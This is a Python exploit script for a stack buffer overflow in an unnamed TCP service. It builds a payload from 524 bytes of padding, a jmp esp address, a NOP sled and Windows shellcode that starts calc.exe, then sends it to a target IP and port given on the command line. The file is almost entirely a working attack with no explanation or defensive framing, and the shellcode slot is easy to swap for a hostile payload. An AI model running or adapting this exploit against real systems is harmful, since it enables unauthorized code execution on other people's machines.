#!/usr/bin/env python3

import socket
import sys
import logging

def exploit(ip, port):
# Junk to reach the overflow
    evil="A"*524

# address of jmp esp
    evil+="\xf3\x12\x17\x31"
# Some NOP     
    evil+="\x90"*20

# Calc.exe shellcode
    evil+="\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
    evil +="\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
    evil +="\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
    evil +="\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
    evil += "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
    evil +="\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
    evil +="\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
    evil +="\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
    evil +="\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f" 
    evil +="\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
    evil +="\x52\xff\xd0";     
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
      s.connect((ip, port))
    except socket.error as msg:
      logging.error("couldn't connect with target (%s)" % msg)
      sys.exit(1)
    data = s.recv(1024)

    logging.debug("read data from server: " + data)
    logging.info("sending evil payload")
    s.send(evil)
    s.close()


if __name__=="__main__":
    logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.DEBUG, datefmt='%d-%b-%y %H:%M:%S')
    if len(sys.argv) != 3:
        logging.error("usage: " + sys.argv[0] + " ip port")
        sys.exit(-1)
    exploit(sys.argv[1], int(sys.argv[2]))
